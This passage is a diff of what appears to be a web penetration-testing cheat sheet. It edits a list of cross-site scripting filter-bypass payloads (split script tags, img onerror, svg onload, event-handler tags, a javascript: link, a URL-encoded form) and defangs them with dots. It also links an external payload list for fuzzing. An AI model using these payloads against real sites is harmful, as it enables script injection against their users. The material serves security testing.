@@ -49,17 +49,17 @@ is it being blocked due to the spaces? remove all spaces from the attack payload
 <br>
 <br>
 <h2>XSS Filter Bypasses</h2> <br>
-
+ <b> remove . from all tags </b> <br>
 <code> Is <script>alert(1)</script> filtered? Try: <br>
-<scr<script>ipt>alert(1)</scr</script>ipt> <br>
-<img src=x onerror=alert(1)> <br>
-<svg/onload=alert(1)> <br>
-<h1 id=x onpointermove=alert(1)>test</h1> <br>
+<.scr<.script>ipt>alert(1)<./scr<./script>ipt> <br>
+<.img src=x onerror=alert(1).> <br>
+<.svg/onload=alert(1)> <br>
+<.h1 id=x onpointermove=alert(1)>test<./h1> <br>
 %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E <br>
-<randomfaketag id=x onwheel=alert(1)><br>
-<a href=javascript:alert(1)>click</a><br>
-<ScRiPt>alert(1)</ScRiPt><br>
- <svg onload/%0A=alert;throw 1337><br>
+<.randomfaketag id=x onwheel=alert(1).><br>
+<.a href=javascript:alert(1)>click<./a><br>
+<.ScRiPt>alert(1)<./ScRiPt><br>
+ <.svg onload/%0A=alert;throw 1337><br>
   </code>
  <br>
 Run through the payload list here on intruder and select grep for url decoded values https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt <br>
